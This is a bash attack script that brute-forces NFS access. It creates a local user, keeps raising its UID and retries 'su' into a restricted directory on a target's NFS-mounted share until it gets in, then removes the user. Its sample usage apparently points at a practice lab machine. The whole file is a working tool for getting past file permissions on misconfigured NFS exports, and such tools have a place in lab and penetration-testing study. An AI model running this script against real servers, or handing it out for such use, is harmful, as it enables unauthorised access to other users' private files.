#!/bin/bash

echo "#################################################################"
echo -e "\n$(tput setaf 6)# uid_enum.sh script matches the target UID #\n\
# of target by creating the same UID # on the local attack box.\n\
# Then bruteforcing the UID # number, if successful this will result\n\
# in being able to gain access on target's nfs mounted restricted directory.$(tput sgr 0)\n"

# Usage
function usage() {
    if [[ "$#" -lt 3 ]]
    then
        echo "[*] usage: uid_enum.sh [user] [starting uid] [forbidden directory]"
        echo "[*] Sample: uid_enum.sh vulnix 1000 /mnt/vulnix/home/vulnix"
	exit
    fi
}
    
# Create user w/ home directory +  selected UID
function cUID() {
    echo -e "$(tput setaf 2)[+] Creating $1 with UID $2$(tput sgr 0)"
    useradd -m -u $2 $1
}

# Check if mounted directory exists.
function dircheck() {
    if [[ -d $3 ]]
    then
        echo -e "$(tput setaf 2)[+] Located directory positioned at: $3$(tput sgr 0)"
   else [[ $? == 1 ]]
	echo "$(tput setaf 1)[-] Directory doesn't exist: $3$(tput sgr 0)"
    fi
}

#su into created user and attempt to enter forbidden directory
function su_usr() {
    inc_num=$2
    until su $1 -c "cd $3"
    do
	echo "$(tput setaf 1)[-] Couldn't enter into $3 with $1$(tput sgr 0)"
	echo "$(tput setaf 3)[*] Incrementing UID + 1$(tput sgr 0)"
	let inc_num+=1
	echo "$(tput setaf 3)[*] UID - $inc_num$(tput sgr 0)"
	usermod -u $inc_num $1
    done
    echo "$(tput setaf 2)[+] Successfully entered directory$(tput sgr 0)"
}

# Remove locally created user.
function rmv_usr() {
    if userdel -r $1
    then
	echo "$(tput setaf 2)[+] $1 removed$(tput sgr 0)"
    else
	echo "$(tput setaf 1)[-] Couldn't remove $1$(tput sgr 0)"
	exit
    fi
}

# Function that calls all functions in order
function exe_f {
    usage $1 $2 $3
    cUID $1 $2 $3
    dircheck $1 $2 $3
    su_usr $1 $2 $3
    rmv_usr $1 $2 $3
}

exe_f $1 $2 $3
